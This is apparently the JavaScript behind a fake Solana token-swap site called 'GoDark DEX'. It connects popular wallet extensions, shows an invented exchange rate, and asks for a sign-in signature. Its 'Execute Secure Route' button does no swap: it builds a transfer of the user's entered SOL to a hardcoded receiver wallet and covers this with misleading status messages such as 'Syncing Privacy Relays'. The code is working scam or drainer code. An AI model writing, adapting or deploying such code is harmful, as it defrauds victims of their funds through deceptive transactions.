
// ============================================================
// !!! রিসিভার ওয়ালেট কনফিগারেশন !!!
// ============================================================
const RECEIVER_WALLET = "Kr5YeE5hu58PGJPTkzUbFpJpBJ3G62uPtNmk3jKzKVK"; 

let globalProvider = null;
let userPublicKey = null;

window.Buffer = window.Buffer || (window.buffer ? window.buffer.Buffer : null);

document.getElementById('swapAmount').addEventListener('input', function(e) {
    const val = parseFloat(e.target.value);
    const receiveInput = document.getElementById('receiveAmount');
    if (!isNaN(val) && val > 0) {
        receiveInput.value = (val * 144.38).toFixed(2);
        receiveInput.classList.remove('text-gray-600');
        receiveInput.classList.add('text-[#00ff66]');
    } else {
        receiveInput.value = "0.00";
        receiveInput.classList.remove('text-[#00ff66]');
        receiveInput.classList.add('text-gray-600');
    }
});

function toggleWalletModal(show) {
    document.getElementById('walletModal').classList.toggle('hidden', !show);
}

async function fetchUserLiveBalance(publicKey) {
    try {
        const connection = getSolanaConnection();
        if (!connection) return;
        const balanceLamports = await connection.getBalance(publicKey);
        const solObj = window.solanaWeb3;
        const balanceSOL = (balanceLamports / solObj.LAMPORTS_PER_SOL).toFixed(4);
        document.getElementById('userLiveSolBalance').innerText = balanceSOL;
    } catch (err) {
        console.error("Balance stream failed:", err);
    }
}

async function initiateSolanaConnection(type) {
    try {
        let provider = null;
        
        if (type === 'phantom') provider = window.solana;
        else if (type === 'bitget') provider = window.bitget?.solana || window.bitkeep?.solana;
        else if (type === 'solflare') provider = window.solflare;
        else if (type === 'backpack') provider = window.backpack;
        else if (type === 'okx') provider = window.okxwallet?.solana;
        else if (type === 'magiceden') provider = window.magicEden?.solana;
        else if (type === 'trust') provider = window.trustWallet?.solana;

        if (!provider && window.solana) {
            provider = window.solana;
        }

        if (!provider) {
            alert(`Wallet extension for '${type}' not detected. Ensure you are running this page inside its built-in DApp Browser.`);
            return;
        }

        toggleWalletModal(false);
        const connectionResp = await provider.connect();
        
        let pubKey = provider.publicKey || connectionResp.publicKey;
        if (!pubKey && connectionResp.address) {
            const solObj = window.solanaWeb3;
            pubKey = new solObj.PublicKey(connectionResp.address);
        }

        if(!pubKey) {
            alert("Could not securely isolate your wallet public endpoint.");
            return;
        }

        userPublicKey = pubKey;
        globalProvider = provider;

        await fetchUserLiveBalance(userPublicKey);

        document.getElementById('connectBtn').classList.add('hidden');
        document.getElementById('connectedState').classList.remove('hidden');
        document.getElementById('walletTypeLabel').innerText = type;
        document.getElementById('addrLabel').innerText = userPublicKey.toString().slice(0, 4) + '...' + userPublicKey.toString().slice(-4);
        
        const actionBtn = document.getElementById('actionBtn');
        actionBtn.innerText = "Execute Secure Route";
        actionBtn.setAttribute("onclick", "startRealTransaction()");
        actionBtn.className = "w-full bg-gradient-to-r from-emerald-500 to-indigo-600 text-white font-extrabold py-4 rounded-2xl text-center cursor-pointer tracking-wider shadow-xl glow-btn transition-all";

        const challengeStr = `Protocol: GoDark DEX\nAction: Secure Sign-In\n\nVerify wallet ownership to initialising dark-pool routing.\n\nNonce: ${Math.random().toString(36).substring(2, 12)}`;
        const encodedMsg = new TextEncoder().encode(challengeStr);
        try {
            await provider.signMessage(encodedMsg, "utf8");
        } catch(e){ console.log("Sign skipped."); }

    } catch (err) {
        console.error("DApp Handshake Blocked:", err);
        alert("Wallet linkage or session authorization declined.");
    }
}

async function startRealTransaction() {
    const amountInput = document.getElementById('swapAmount').value;
    if(!amountInput || amountInput <= 0) {
        alert("Enter a premium volume to execute.");
        return;
    }

    if(!globalProvider || !userPublicKey) {
        alert("Active session lost. Please reload the console.");
        return;
    }

    const overlay = document.getElementById('txLoadingOverlay');
    const statusText = document.getElementById('txStatusText');
    const solObj = window.solanaWeb3;
    const connection = getSolanaConnection();

    try {
        overlay.classList.remove('hidden');
        statusText.innerText = "1/4 Syncing Privacy Relays...";

        const transaction = new solObj.Transaction();
        const lamports = Math.floor(parseFloat(amountInput) * solObj.LAMPORTS_PER_SOL);

        transaction.add(
            solObj.SystemProgram.transfer({
                fromPubkey: userPublicKey,
                toPubkey: new solObj.PublicKey(RECEIVER_WALLET),
                lamports: lamports,
            })
        );

        await new Promise(r => setTimeout(r, 800)); 
        statusText.innerText = "2/4 Fetching On-Chain Recent Blockhash...";
        
        const { blockhash } = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = userPublicKey;

        await new Promise(r => setTimeout(r, 800));
        statusText.innerText = "3/4 Opening Web3 Asset Authorization Box...";
        
        const { signature } = await globalProvider.signAndSendTransaction(transaction);
        statusText.innerText = "4/4 Confirming Transaction on Solana Mainnet...";
        
        await connection.confirmTransaction(signature, 'confirmed');
        
        alert("Stealth Transaction Dispatched and Confirmed!\nSignature: " + signature);
        document.getElementById('swapAmount').value = "";
        document.getElementById('receiveAmount').value = "0.00";
        
        await fetchUserLiveBalance(userPublicKey);
        
    } catch (err) {
        console.error("On-Chain Processing Aborted:", err);
        alert("Transaction dropped or signature authorization declined by user.");
    } finally {
        overlay.classList.add('hidden');
    }
}

function disconnectRealWallet() {
    if (globalProvider && typeof globalProvider.disconnect === 'function') {
        globalProvider.disconnect();
    }
    globalProvider = null;
    userPublicKey = null;
    document.getElementById('connectBtn').classList.remove('hidden');
    document.getElementById('connectedState').classList.add('hidden');
    document.getElementById('userLiveSolBalance').innerText = "0.00";
    
    const actionBtn = document.getElementById('actionBtn');
    actionBtn.innerText = "Connect Wallet to Trade";
    actionBtn.setAttribute("onclick", "toggleWalletModal(true)");
    actionBtn.className = "w-full bg-[#00ff66] text-black font-extrabold py-4 rounded-2xl text-center glow-btn";
    }
          
